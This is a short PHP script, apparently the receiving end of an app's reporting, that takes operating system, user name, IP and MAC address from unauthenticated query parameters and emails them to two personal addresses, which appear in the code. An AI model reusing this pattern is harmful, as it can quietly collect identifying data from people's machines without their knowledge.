<?php 
	$op = $_GET['op'];
	$ip = $_GET['ip'];
	$user = $_GET['user'];
	$mac_address = $_GET['mac_address'];
	
	$message = "SistemaOperacional: $op;\nNomeUsuario: $user; \nIP: $ip;\nMacAdress: $mac_address.";
	mail("ilton_unb@hotmail.com", "Western INFOs Jorge", "$message","From: western_app@gmail.com");
	mail("ton.garcia.jr@gmail.com","Western INFOs Jorge", "$message","From: western_app@gmail.com");
?>